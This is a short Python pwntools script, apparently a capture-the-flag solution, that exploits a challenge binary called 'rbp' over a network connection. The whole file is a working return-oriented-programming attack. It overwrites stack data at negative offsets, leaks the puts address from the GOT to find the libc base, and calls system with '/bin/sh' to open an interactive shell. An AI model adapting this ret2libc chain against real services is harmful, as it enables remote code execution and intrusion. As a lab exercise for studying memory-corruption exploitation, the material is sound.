from pwn import *

def write(name, offset):
    conn.sendafter('? ', name)
    conn.sendlineafter('? ', str(offset))

elf = ELF('../challenge/rbp')
conn = remote('0.0.0.0', 1337)

pop_rdi = 0x00000000004012b3

write(b'A'*8 + p64(elf.symbols['main'] + 0x1)*2, -0x20)
write(p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']), -0x28)

leak = u64(conn.recvline().strip().ljust(8, b'\x00'))
libc_base = leak - 0x809d0
log.success('libc base: ' + hex(libc_base))

system = libc_base + 0x4fa60
bin_sh = libc_base + 0x1abf05
write(p64(pop_rdi) + p64(bin_sh) + p64(system), -0x28)

conn.interactive()
